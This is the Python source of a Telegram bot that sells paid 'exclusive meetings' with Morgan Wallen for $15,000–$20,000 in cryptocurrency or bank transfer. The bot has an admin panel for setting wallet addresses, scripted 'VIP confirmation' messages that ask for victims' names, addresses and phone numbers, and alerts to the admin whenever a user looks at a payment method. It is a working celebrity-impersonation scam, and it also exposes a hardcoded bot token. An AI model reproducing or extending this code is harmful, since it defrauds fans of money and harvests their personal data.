from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
import sqlite3
from datetime import datetime, timedelta
import os
import threading
import urllib.request
import json
from flask import Flask

# ================= RENDER HEARTBEAT =================
server = Flask(__name__)
@server.route('/')
def health_check(): return "Alive", 200

# ================= SETTINGS =================
TOKEN = "8681446523:AAHs42JckBFG_n-OYsASEbv-6Q4eFUlE5tw"
ADMIN_IDS = [7936558915]

def is_admin(user_id): return user_id in ADMIN_IDS

# ================= BTC PRICE CONVERTER =================
def get_btc_amount(usd_amount):
    try:
        url = "https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        response = urllib.request.urlopen(req)
        data = json.loads(response.read())
        btc_price = float(data['price'])
        return f"{round(usd_amount / btc_price, 6)} BTC"
    except Exception:
        return f"${usd_amount} (BTC equivalent)"

# ================= DATABASE =================
conn = sqlite3.connect("bot.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, blocked INTEGER DEFAULT 0)")
cursor.execute("CREATE TABLE IF NOT EXISTS wallets (coin TEXT PRIMARY KEY, address TEXT, memo TEXT, network TEXT, guide TEXT)")
cursor.execute("CREATE TABLE IF NOT EXISTS settings (id INTEGER PRIMARY KEY, rej_msg TEXT, app_msg TEXT, price_meet INTEGER, price_biz INTEGER)")

# Database Migration: Ensure new columns exist for existing users
try:
    cursor.execute("ALTER TABLE wallets ADD COLUMN network TEXT")
    cursor.execute("ALTER TABLE wallets ADD COLUMN guide TEXT")
except: pass

default_app = "🎉 **Payment Confirmed Successfully**\n\n━━━━━━━━━━━━━━━━━━\n👑 **VIP CONFIRMATION NOTICE**\n━━━━━━━━━━━━━━━━━━\n\nDear User,\n\nYour payment has been successfully verified. Your exclusive meeting with **Morgan Wallen** is now officially scheduled.\n\n📅 **Scheduled Date:** {date}\n\n🎫 **VIP Recognition Card:**\nA VIP Fan Card will be issued as your official form of recognition and identification for the meeting. This card will be prepared and shipped to you within the next **2 days**.\n\n📦 **Shipping & Delivery:**\nPersonal details such as your **Full Name, Shipping Address, and Phone Number** must be provided by you once the card is ready for dispatch to ensure a secure delivery.\n\nThank you for your trust. We look forward to delivering a premium experience.\n\n━━━━━━━━━━━━━━━━━━\nStatus: **CONFIRMED ✅**"
cursor.execute("INSERT OR IGNORE INTO settings (id, price_meet, price_biz, app_msg) VALUES (1, 15000, 20000, ?)", (default_app,))

# Initialize Default Networks
for c, n in [("BTC", "Bitcoin Network"), ("ETH", "Ethereum (ERC20) Network"), ("USDT", "Tron (TRC20) Network")]:
    cursor.execute("INSERT OR IGNORE INTO wallets (coin, network) VALUES (?, ?)", (c, n))
conn.commit()

def get_wallet(coin):
    cursor.execute("SELECT address, memo, network, guide FROM wallets WHERE coin=?", (coin,))
    row = cursor.fetchone()
    return row if row else ("NOT SET", None, "Mainnet", None)

def get_prices():
    cursor.execute("SELECT price_meet, price_biz FROM settings WHERE id=1")
    res = cursor.fetchone()
    return res if res else (15000, 20000)

def is_blocked(user_id):
    cursor.execute("SELECT blocked FROM users WHERE user_id=?", (user_id,))
    row = cursor.fetchone()
    return row[0] == 1 if row else False

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_blocked(user.id): return

    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user.id,))
    conn.commit()

    if not is_admin(user.id):
        for admin in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    chat_id=admin,
                    text=f"🔔 **New User Alert!**\n👤 **Name:** {user.first_name}\n🆔 **ID:** `{user.id}`",
                    parse_mode="Markdown"
                )
            except: pass

    keyboard = [[InlineKeyboardButton("🎯 Book Meeting", callback_data="book")]]
    if is_admin(user.id):
        keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
        
    welcome_text = (
        f"Welcome, {user.first_name}.\n\n"
        "Thank you for your interest in scheduling an exclusive meeting. "
        "Please select the option below to proceed with your booking."
    )
    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard))

# ================= CALLBACKS =================
async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    uid = query.from_user.id
    if not is_admin(uid) and is_blocked(uid): return
    
    await query.answer()
    data = query.data

    if data.startswith("copy_"):
        val = data.replace("copy_", "")
        await query.message.reply_text(f"`{val}`", parse_mode="MarkdownV2")
        return

    # ADMIN PANEL
    if data == "admin_panel" and is_admin(uid):
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE blocked=1")
        blocked_users = cursor.fetchone()[0]
        
        kb = [[InlineKeyboardButton("💰 Prices", callback_data="edit_prices"), InlineKeyboardButton("💳 Wallets", callback_data="wallet_menu")],
              [InlineKeyboardButton("💬 DM User", callback_data="dm_user"), InlineKeyboardButton("🚫 Block Manager", callback_data="block_mgmt")],
              [InlineKeyboardButton("✅ Edit Approval", callback_data="set_app_msg"), InlineKeyboardButton("❌ Edit Reject", callback_data="set_rej_msg")],
              [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")]]
        
        admin_info = f"📊 **Admin Panel**\n👤 Admin ID: `{uid}`\n👥 Total Users: `{total_users}`\n🚫 Blocked Users: `{blocked_users}`"
        await query.edit_message_text(admin_info, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "wallet_menu" and is_admin(uid):
        kb = [[InlineKeyboardButton("BTC", callback_data="manage_BTC"), InlineKeyboardButton("ETH", callback_data="manage_ETH")],
              [InlineKeyboardButton("USDT", callback_data="manage_USDT"), InlineKeyboardButton("Bank", callback_data="manage_Bank")],
              [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]
        await query.edit_message_text("Select asset to edit:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("manage_") and is_admin(uid):
        coin = data.split("_")[1]
        addr, memo, net, guide = get_wallet(coin)
        kb = [[InlineKeyboardButton("📝 Set Address", callback_data=f"set_addr_{coin}")],
              [InlineKeyboardButton("📝 Set Memo", callback_data=f"set_memo_{coin}")]]
        
        if coin in ["USDT", "ETH", "BTC"]:
            kb.append([InlineKeyboardButton("🌐 Set Network", callback_data=f"set_net_{coin}")])
            kb.append([InlineKeyboardButton("📘 Set Guide", callback_data=f"set_guide_{coin}")])
            
        kb.append([InlineKeyboardButton("⬅️ Back", callback_data="wallet_menu")])
        await query.edit_message_text(f"💎 **{coin} Management**\n\nNet: `{net}`\nAddr: `{addr}`\nMemo: `{memo}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data.startswith("set_") and is_admin(uid):
        parts = data.split("_") # set_field_coin
        context.user_data["edit"] = (parts[2], parts[1]) # (Coin, Field)
        await query.edit_message_text(f"📥 Send the new **{parts[1]}** for {parts[2]}:")

    elif data.startswith("guide_"):
        coin = data.split("_")[1]
        addr, memo, net, custom_guide = get_wallet(coin)
        
        if custom_guide:
            guide_text = custom_guide
        else:
            guide_text = (
                f"📘 **Official {coin} Payment Guide**\n\n"
                f"To complete your booking, please follow these professional steps to ensure your {coin} transfer is successful:\n\n"
                f"1️⃣ **Access Your Wallet:** Open your preferred exchange or personal wallet.\n\n"
                f"2️⃣ **Initiate Transfer:** Select Withdraw/Send and choose {coin}.\n\n"
                f"3️⃣ **Select Network:** Critical step. Use **{net}**.\n\n"
                f"4️⃣ **Details:** Copy the address provided and paste it. If a Memo is shown, you MUST include it.\n\n"
                f"5️⃣ **Finalize:** Enter amount and tap Confirm.\n\n"
                f"⚠️ Note: Success reflects in 10-30 mins."
            )
        await query.message.reply_text(guide_text, parse_mode="Markdown")

    # USER UI LOGIC
    elif data == "book":
        p_meet, p_biz = get_prices()
        kb = [[InlineKeyboardButton(f"Meet & Greet (${p_meet})", callback_data="type_meet")], 
              [InlineKeyboardButton(f"Business (${p_biz})", callback_data="type_biz")]]
        await query.edit_message_text("Choose meeting type:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("type_"):
        context.user_data["m_type"] = "Meet & Greet" if "meet" in data else "Business"
        context.user_data["step"] = "reason"
        await query.edit_message_text("Send your reason for the meeting:")

    elif data.startswith("pay_"):
        coin = data.split("_")[1]
        reason = context.user_data.get("reason_text", "N/A")
        
        # ACTIVITY ALERT
        if not is_admin(uid):
            for admin in ADMIN_IDS:
                try: await context.bot.send_message(chat_id=admin, text=f"💳 **Activity Alert**\nUser: `{uid}`\nViewing: {coin}\nReason: {reason}", parse_mode="Markdown")
                except: pass

        p_meet, p_biz = get_prices()
        price = p_meet if context.user_data.get("m_type") == "Meet & Greet" else p_biz
        addr, memo, net, _ = get_wallet(coin)

        if coin == "Bank" and addr == "NOT SET":
            await query.message.reply_text("Unavailable due to network issues.")
            return

        display_price = get_btc_amount(price) if coin == "BTC" else f"${price}"
        kb = [[InlineKeyboardButton("📋 Copy Address", callback_data=f"copy_{addr}")]]
        if memo: kb.append([InlineKeyboardButton("📋 Copy Memo", callback_data=f"copy_{memo}")])
        if coin != "Bank": kb.append([InlineKeyboardButton("📘 Payment Guide", callback_data=f"guide_{coin}")])
        kb.append([InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm_payment")])
        
        await query.message.reply_text(f"🧾 **Invoice**\nAmt: {display_price}\nCoin: {coin}\nNet: {net}\n\n📍 **Addr:** `{addr}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    # REST OF ADMIN BUTTONS (Block, Approval, etc.)
    elif data == "block_mgmt" and is_admin(uid):
        context.user_data["step"] = "input_block_id"
        await query.edit_message_text("🚫 Enter the **User ID** to manage:")

    elif data.startswith("do_block_") or data.startswith("do_unblock_"):
        target = data.split("_")[2]
        val = 1 if "do_block" in data else 0
        cursor.execute("UPDATE users SET blocked = ? WHERE user_id = ?", (val, target))
        conn.commit()
        await query.edit_message_text(f"✅ User `{target}` status updated.", parse_mode="Markdown")

    elif data == "confirm_payment":
        for admin in ADMIN_IDS:
            kb = [[InlineKeyboardButton("✅ Approve", callback_data=f"approve_{uid}"), InlineKeyboardButton("❌ Reject", callback_data=f"reject_{uid}")]]
            await context.bot.send_message(chat_id=admin, text=f"🧾 **Payment Alert**\nFrom: `{uid}`", reply_markup=InlineKeyboardMarkup(kb))
        await query.edit_message_text("⏳ Awaiting admin approval...")

# ================= TEXT HANDLER =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_admin(uid) and is_blocked(uid): return
    txt = update.message.text
    step = context.user_data.get("step")

    if is_admin(uid):
        if context.user_data.get("edit"):
            coin, field = context.user_data.pop("edit")
            # Map field to DB column
            mapping = {"addr": "address", "memo": "memo", "net": "network", "guide": "guide"}
            col = mapping.get(field)
            cursor.execute(f"UPDATE wallets SET {col} = ? WHERE coin = ?", (txt, coin))
            conn.commit()
            kb = [[InlineKeyboardButton("✅ Done", callback_data=f"manage_{coin}")]]
            await update.message.reply_text(f"✅ **{field.capitalize()}** updated for {coin}!", reply_markup=InlineKeyboardMarkup(kb))
        
        elif step == "input_block_id":
            context.user_data["step"] = None
            kb = [[InlineKeyboardButton("🚫 Block", callback_data=f"do_block_{txt}"), InlineKeyboardButton("✅ Unblock", callback_data=f"do_unblock_{txt}")]]
            await update.message.reply_text(f"Action for `{txt}`:", reply_markup=InlineKeyboardMarkup(kb))

        elif step == "dm_id":
            context.user_data["dm_target"] = txt
            context.user_data["step"] = "dm_msg"
            await update.message.reply_text("📝 Send message:")

        elif step == "dm_msg":
            target = context.user_data.pop("dm_target")
            context.user_data["step"] = None
            try: await context.bot.send_message(chat_id=target, text=txt)
            except: pass
            await update.message.reply_text("✅ Sent.")

    elif step == "reason":
        context.user_data["reason_text"] = txt
        context.user_data["step"] = None
        kb = [[InlineKeyboardButton("BTC", callback_data="pay_BTC"), InlineKeyboardButton("ETH", callback_data="pay_ETH")],
              [InlineKeyboardButton("USDT", callback_data="pay_USDT"), InlineKeyboardButton("Bank", callback_data="pay_Bank")]]
        await update.message.reply_text("Choose payment method:", reply_markup=InlineKeyboardMarkup(kb))
    
    else: # Chat Fail-safe
        for admin in ADMIN_IDS:
            kb = [[InlineKeyboardButton("↩️ Reply", callback_data=f"reply_{uid}")]]
            await context.bot.send_message(chat_id=admin, text=f"📩 **Message from {uid}**\n\n{txt}", reply_markup=InlineKeyboardMarkup(kb))

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    threading.Thread(target=lambda: server.run(host='0.0.0.0', port=10000), daemon=True).start()
    app.run_polling()
